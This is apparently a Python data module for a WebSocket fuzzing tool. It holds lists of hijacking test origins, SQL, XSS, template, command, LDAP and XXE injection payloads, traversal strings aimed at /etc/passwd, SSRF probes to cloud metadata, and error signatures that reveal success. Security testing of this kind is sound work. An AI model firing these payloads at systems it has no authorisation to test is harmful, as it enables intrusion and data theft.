"""Payload databases for WebSocket fuzzing."""

CSWSH_ORIGINS = [
    # Classic attacker domains
    "https://evil.com", "http://evil.com", "https://attacker.net",
    "https://malicious.example", "http://localhost.evil.com",
    # Null origin (sandboxed iframes)
    "null",
    # Lookalike domains
    "https://localhost.evil.com", "https://target.local.evil.com",
    # Scheme downgrades
    "http://{target}", "ws://{target}",
    # Subdomain wildcards
    "https://sub.target.evil.com",
    # Unicode / homoglyph
    "https://tаrget.com",  # Cyrillic а
    # Case tricks
    "HTTPS://EVIL.COM",
    # Path tricks
    "https://target.com@evil.com",
    # Port tricks
    "https://target.com:8080",
    # Trailing chars
    "https://evil.com.", "https://evil.com/",
    # IPv6
    "http://[::1]", "http://[::ffff:127.0.0.1]",
    # IP forms of localhost
    "http://127.0.0.1", "http://127.1", "http://0.0.0.0",
    "http://0177.0.0.1", "http://2130706433",
]

INJECTION_PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--",
        "1' AND SLEEP(3)--", "1'; WAITFOR DELAY '0:0:3'--",
        "' AND 1=CAST((SELECT version()) AS int)--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "'\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "\"><svg/onload=confirm(1)>",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}",
        "{{''.__class__.__mro__}}",
    ],
    "cmdi": [
        "; id", "| id", "`id`", "$(id)", "& whoami",
        "'; ping -c 1 127.0.0.1; '", "1; sleep 3",
    ],
    "traversal": [
        "../../../etc/passwd", "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
        "/etc/passwd%00", "..\\..\\..\\windows\\win.ini",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22", "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_PING",
    ],
    "ldap": [
        "*)(uid=*))(|(uid=*", "*)(|(password=*))",
        "admin)(&(password=*))",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    ],
}

# Error signatures that indicate successful injection
ERROR_SIGNATURES = {
    "sqli": [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
        "SQLite", "sqlstate", "unclosed quotation",
        "You have an error in your SQL",
    ],
    "ssti": [
        "TemplateSyntaxError", "jinja2", "Freemarker", "Velocity",
        "49",  # 7*7
    ],
    "cmdi": [
        "uid=", "gid=", "groups=",  # id
        "root:", "bin:", "nobody:",  # /etc/passwd via whoami
    ],
    "traversal": [
        "root:x:", "root:*:", "[fonts]",  # win.ini
    ],
    "ssrf": [
        "ami-id", "instance-id", "availability-zone",
        "SSH-2.0-", "redis_version",
    ],
    "ldap": [
        "LDAP", "ldap_search", "invalid DN",
    ],
    "xxe": [
        "root:x:",
    ],
    "xss": [
        "<script>alert(1)</script>",  # reflection
        "onerror=alert(1)",
    ],
}

# Subprotocol-specific playbooks
PROTOCOL_PLAYBOOKS = {
    "graphql-ws": {
        "probe": '{"type":"connection_init","payload":{}}',
        "subscribe": '{"id":"1","type":"start","payload":{"query":"{__typename}"}}',
    },
    "graphql-transport-ws": {
        "probe": '{"type":"connection_init"}',
        "subscribe": '{"id":"1","type":"subscribe","payload":{"query":"{__typename}"}}',
    },
    "socket.io": {
        "probe": "40",
        "handshake": "40/admin,",
    },
    "stomp": {
        "probe": "CONNECT\naccept-version:1.2\nhost:localhost\n\n\x00",
    },
    "mqtt": {
        "probe": b"\x10\x0c\x00\x04MQTT\x04\x02\x00\x3c\x00\x00",
    },
}
